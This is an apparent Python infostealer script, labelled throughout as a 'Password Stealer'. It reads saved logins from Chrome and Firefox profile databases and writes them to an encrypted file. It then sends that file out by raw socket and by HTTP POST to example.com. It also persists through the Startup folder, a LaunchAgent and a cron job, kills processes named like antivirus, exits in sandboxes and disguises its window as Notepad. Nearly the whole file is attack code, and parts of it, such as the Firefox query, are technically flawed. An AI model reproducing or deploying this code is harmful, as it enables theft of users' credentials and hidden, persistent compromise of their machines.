import os
import sys
import socket
import threading
import time
import base64
import subprocess
import psutil
import ctypes
import sqlite3
import requests
import random
import shutil
from cryptography.fernet import Fernet

# Step 1: Disguised Payload
def innocent_function():
    # Simulate a harmless activity
    print("Executing harmless function...")
    time.sleep(1)
    if sys.platform == 'win32':
        os.system('systeminfo')
    else:
        os.system('uname -a')

# Step 2: Entrance Point
def main():
    # Trigger the Password Stealer's execution
    innocent_function()
    password_stealer()

# Step 3: Password Stealing Mechanism
def password_stealer():
    threading.Thread(target=steal_passwords).start()
    threading.Thread(target=send_data_to_server).start()
    threading.Thread(target=conceal_malicious_activity).start()
    threading.Thread(target=establish_persistence).start()
    threading.Thread(target=evade_detection).start()
    threading.Thread(target=exfiltrate_data_via_http).start()
    threading.Thread(target=randomized_task_scheduler).start()
    threading.Thread(target=environment_analysis).start()

def steal_passwords():
    try:
        passwords = []
        if sys.platform == 'win32':
            chrome_path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
            firefox_path = os.path.expanduser('~') + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\'
        elif sys.platform == 'darwin':  # macOS
            chrome_path = os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Default/Login Data'
            firefox_path = os.path.expanduser('~') + '/Library/Application Support/Firefox/Profiles/'
        else:  # Linux
            chrome_path = os.path.expanduser('~') + '/.config/google-chrome/Default/Login Data'
            firefox_path = os.path.expanduser('~') + '/.mozilla/firefox/'
        
        # Extract passwords from Chrome
        try:
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            rows = cursor.fetchall()
            for row in rows:
                passwords.append(f"Chrome - URL: {row[0]}, Username: {row[1]}, Password: {row[2]}")
            conn.close()
        except Exception as e:
            print(f"Error extracting passwords from Chrome: {e}")

        # Extract passwords from Firefox
        try:
            for file_name in os.listdir(firefox_path):
                file_path = os.path.join(firefox_path, file_name)
                if file_name.endswith('.sqlite'):
                    conn = sqlite3.connect(file_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin, usernameField, passwordField FROM logins')
                    rows = cursor.fetchall()
                    for row in rows:
                        passwords.append(f"Firefox - URL: {row[0]}, Username: {row[1]}, Password: {row[2]}")
                    conn.close()
        except Exception as e:
            print(f"Error extracting passwords from Firefox: {e}")

        store_stolen_data(passwords)
        print("Stolen passwords")
    except Exception as e:
        print(f"Error stealing passwords: {e}")

def store_stolen_data(data):
    try:
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)
        with open('stolen_data.txt', 'a') as file:
            for entry in data:
                encrypted_data = cipher_suite.encrypt(entry.encode())
                file.write(encrypted_data.decode() + '\n')
        with open('encryption_key.txt', 'w') as key_file:
            key_file.write(key.decode())
    except Exception as e:
        print(f"Error storing stolen data: {e}")

def send_data_to_server():
    try:
        server_address = ('127.0.0.1', 12345)
        with open('stolen_data.txt', 'r') as file:
            data = file.read()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(server_address)
        sock.sendall(data.encode())
        sock.close()
        print(f"Sent data to {server_address}")
    except Exception as e:
        print(f"Error sending data: {e}")

def exfiltrate_data_via_http():
    try:
        url = 'http://example.com/upload'
        files = {'file': open('stolen_data.txt', 'rb')}
        response = requests.post(url, files=files)
        print(f"Exfiltrated data via HTTP: {response.status_code}")
    except Exception as e:
        print(f"Error exfiltrating data via HTTP: {e}")

def conceal_malicious_activity():
    try:
        if sys.platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW("Notepad")
        elif sys.platform == 'darwin':
            os.system('osascript -e \'tell application "System Events" to set visible of process "Python" to false\'')
        else:
            os.system('xterm -T "Notepad"')
        print("Concealing malicious activity...")
        while True:
            time.sleep(10)
    except Exception as e:
        print(f"Error concealing activity: {e}")

def establish_persistence():
    try:
        if sys.platform == 'win32':
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            script_path = os.path.abspath(__file__)
            if not os.path.exists(startup_path):
                os.makedirs(startup_path)
            shutil.copy(script_path, startup_path)
        elif sys.platform == 'darwin':
            plist_content = f'''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.example.malware</string>
                <key>ProgramArguments</key>
                <array>
                    <string>{os.path.abspath(__file__)}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
            </dict>
            </plist>
            '''
            plist_path = os.path.expanduser('~/Library/LaunchAgents/com.example.malware.plist')
            with open(plist_path, 'w') as plist_file:
                plist_file.write(plist_content)
            os.system(f'launchctl load {plist_path}')
        else:
            cron_job = f'@reboot {os.path.abspath(__file__)}'
            with open('mycron', 'w') as cron_file:
                cron_file.write(cron_job)
            os.system('crontab mycron')
            os.remove('mycron')
        print("Establishing persistence...")
    except Exception as e:
        print(f"Error establishing persistence: {e}")

def evade_detection():
    try:
        while True:
            for proc in psutil.process_iter():
                try:
                    if proc.name().lower() in ['antivirus.exe', 'securitysoftware.exe', 'defender.exe']:
                        proc.kill()
                        print(f"Killed process: {proc.name()}")
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            time.sleep(10)
    except Exception as e:
        print(f"Error evading detection: {e}")

def randomized_task_scheduler():
    try:
        while True:
            task_choice = random.choice([
                steal_passwords,
                send_data_to_server,
                exfiltrate_data_via_http,
                conceal_malicious_activity,
                establish_persistence,
                evade_detection
            ])
            task_thread = threading.Thread(target=task_choice)
            task_thread.start()
            sleep_time = random.randint(10, 60)
            time.sleep(sleep_time)
    except Exception as e:
        print(f"Error in randomized task scheduler: {e}")

def environment_analysis():
    try:
        suspicious_terms = ['microsoft', 'vmware', 'virtualbox', 'sandbox']
        if any(term in os.uname().release.lower() for term in suspicious_terms):
            print("Suspicious environment detected. Exiting.")
            sys.exit(1)
    except Exception as e:
        print(f"Error in environment analysis: {e}")

if __name__ == "__main__":
    main()
